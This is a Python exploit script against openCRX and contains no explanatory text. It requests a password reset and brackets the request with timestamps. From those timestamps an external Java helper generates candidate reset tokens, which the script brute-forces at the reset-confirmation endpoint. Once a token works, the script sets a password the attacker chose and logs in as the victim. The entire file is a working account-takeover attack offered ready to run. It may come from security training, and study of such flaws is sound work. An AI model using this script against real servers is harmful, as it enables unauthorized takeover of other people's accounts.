import requests, time, sys, argparse, subprocess, re
from multiprocessing import Pool

s = requests.session()
proxies = {
  "http": "http://127.0.0.1:8080",
  "https": "https://127.0.0.1:8080",
}

def timestamp():
	return round(time.time() * 1000)

def generateToken(ip, user):
	t1 = timestamp()
	time.sleep(3)
	requestReset(ip, user)
	t2 = timestamp()
	cmd = "java OpenCRXToken %d %d" % (t1, t2)
	gen = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True)
	tokens = gen.stdout.read().decode("UTF-8").split("\n")[:-1]
	num = "\n[+] Generated %s tokens." % len(tokens)
	print(num)
	return tokens

def requestReset(ip, user):
	target = "http://%s/opencrx-core-CRX/RequestPasswordReset.jsp" % ip
	data = {"id": user}
	req = s.post(target, data=data)
	res = req.text
	if "Password reset request successful" in res:
		print("\n[+] Password reset requested for user %s" % user)
	elif "Unable to request password reset" in res:
		print("\n[!] Error: user %s not found." % user)
		sys.exit(-1)

def resetPassword(ip, tokens, user, passwd):
	target = "http://%s/opencrx-core-CRX/PasswordResetConfirm.jsp" % ip
	for token in tokens:
		print(f"\r[+] Trying: {token}",end="")
		data = { "t": token,
				 "p": "CRX",
				 "s": "Standard",
				 "id": user,
				 "password1": passwd,
				 "password2": passwd }
		req = s.post(target, data)
		res = req.text
		if "Password successfully changed for" in res:
			match = re.search(r'<h2>Password successfully changed for (.*?)</h2>', res)
			if match:
				user = match.group(1)
				print("\n[+] Credential "+passwd+" succesfully applied for user "+user)
				break

def authenticate(ip, user, passwd):
	target = "http://%s" % ip
	data = { "j_username": user,
	 		 "j_password": passwd }
	s.get(target + '/opencrx-core-CRX/ObjectInspectorServlet?loginFailed=false')
	print("\n[+] Attempting to authenticate with the applied credentials...")
	req = s.post(target + '/opencrx-core-CRX/j_security_check', data=data)
	res = req.text
	if "?requestId=" in res:
		print("\n[+] Login successful!")
		match = re.search(r"href='(.*?)';", res)
		if match:
			url = match.group(1)
			req = s.get(url)
			res = req.text
			user = re.search(r"<title>(.*?)</title>", res)
			if user:
				print(user.group(1))
	else:
		print("\n[!] Login failed.")

def main():
	parser = argparse.ArgumentParser()
	parser.add_argument('--ip', help='Target IP address', required=True)
	parser.add_argument('--user', help='Target username', required=True)
	parser.add_argument('--passwd', help='Desired password to be defined', required=True)
	args = parser.parse_args()
	if len(sys.argv)<=1:
		print("[!] Usage: python3 %s --ip 192.168.0.5 --user USER --pass NewPass@123" % sys.argv[0])
		parser.print_help()
		sys.exit(-1)
	ip = args.ip
	user = args.user
	passwd = args.passwd

	tokens = generateToken(ip, user)
	resetPassword(ip, tokens, user, passwd)
	authenticate(ip, user, passwd)

if __name__ == "__main__":
	main()
